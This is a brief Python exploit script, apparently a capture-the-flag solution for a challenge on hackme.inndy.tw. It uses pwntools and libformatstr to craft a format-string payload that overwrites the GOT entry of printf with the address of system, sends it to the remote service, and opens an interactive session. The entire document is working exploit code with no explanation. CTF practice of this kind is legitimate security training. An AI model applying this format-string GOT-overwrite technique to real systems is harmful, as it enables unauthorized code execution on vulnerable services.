
from pwn import *
from libformatstr import FormatStr
r = remote('hackme.inndy.tw', '7711')

printf = 0x0804a010

system = 0x8048400

fmt = FormatStr()
fmt[printf] = system
fmt_str = fmt.payload(7, start_len=0)

r.sendline(fmt_str)

r.interactive()
